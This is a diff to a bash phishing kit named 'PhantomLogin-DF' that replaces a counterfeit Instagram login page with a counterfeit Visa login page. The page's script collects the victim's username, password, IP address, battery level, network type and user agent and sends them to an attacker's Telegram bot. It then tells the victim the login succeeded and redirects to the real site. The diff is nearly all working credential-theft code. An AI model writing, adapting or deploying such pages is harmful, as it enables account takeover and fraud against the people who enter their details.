@@ -18,7 +18,7 @@ show_banner() {
     ${NC}"
     echo -e "${YELLOW}-----------------------------------------------------------------------------------"
     echo -e "[+] Tool      : PhantomLogin-DF"
-    echo -e "[+] Version   : 2.0"
+    echo -e "[+] Version   : 3.0"
     echo -e "[+] Coder     : @A_Y_TR"
     echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
     echo -e "-----------------------------------------------------------------------------------${NC}"
@@ -915,82 +915,205 @@ Device Name📱: \${deviceInfo.deviceName}
 EOF
 }
 
-Instagram2_page() {
+visa_page() {
     cat <<EOF
     <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>Visa Login</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
-        .login-container img { width: 175px; margin-bottom: 25px; }
-        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
-        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
-        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
-        .btn-login:hover { background-color: #3578e5; }
-        .forgot-password { margin-top: 10px; font-size: 14px; }
-        .forgot-password a { color: #4c86ff; text-decoration: none; }
-        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
-        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
-        .signup-btn:hover { background-color: #f4f4f4; }
-        .terms { margin-top: 20px; font-size: 12px; color: #888; }
-        .terms a { color: #4c86ff; text-decoration: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            width: 360px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-container img {
+            width: 100px;
+            margin-bottom: 25px;
+        }
+
+        h2 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #1a1a1a;
+            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a1a1a;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-login:hover {
+            background-color: #333;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #1a1a1a;
+            text-decoration: none;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            font-size: 14px;
+            color: #1a1a1a;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .signup-btn:hover {
+            background-color: #f4f4f4;
+        }
+
+        .terms {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .terms a {
+            color: #1a1a1a;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
+
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
-        <h2>Sign in to Instagram</h2>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
+        <h2>Sign in to Visa</h2>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="text" id="username" placeholder="Email or phone" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" class="btn-login">Log In</button>
         </form>
         <p class="forgot-password"><a href="#">Forgot password?</a></p>
         <div class="divider"></div>
-        <button class="signup-btn">Don't have an account? Sign up</button>
+        <button class="signup-btn">Create account</button>
     </div>
+
     <script>
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', async function (event) {
             event.preventDefault();
+            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
             const deviceInfo = await getDeviceInfo();
+
             const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json',
+                },
                 body: JSON.stringify({
                     chat_id: '${id}',
-                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
+                    text: \`
+Visa Login Attempt:
+
+Username📧: \${username}
+Password🔑: \${password}
+
+Device Info📲:
+
+IP Address🌍: \${deviceInfo.ip}
+Battery Level🔋: \${deviceInfo.batteryLevel}%
+Network Type📡: \${deviceInfo.networkType}
+Device Name📱: \${deviceInfo.deviceName}
+                    \`
                 })
             });
+
             const result = await response.json();
+
             if (result.ok) {
                 alert('Login successful! Redirecting...');
-                window.location.href = 'https://www.instagram.com';
+                window.location.href = 'https://www.visa.com';
             } else {
                 alert('Login failed. Please check your credentials.');
             }
         });
+
         async function getDeviceInfo() {
             const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
             const battery = await navigator.getBattery();
             const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
             const deviceName = navigator.userAgent;
-            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
+
+            return {
+                ip: ip.ip,
+                batteryLevel: Math.round(battery.level * 100),
+                networkType: networkType,
+                deviceName: deviceName,
+            };
         }
     </script>
 </body>
 </html>
 EOF
 }
-
+ 
 start_local_server() {
     echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
     pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"
@@ -1088,8 +1211,8 @@ case $choice in
         create_page "$page" "$(tiktok_page)"
         ;;
     5)
-        page="Instagram2_login"
-        create_page "$page" "$(Instagram2_page)"
+        page="visa_login"
+        create_page "$page" "$(visa_page)"
         ;;
     6)
         page="CameraAndLocation_login"
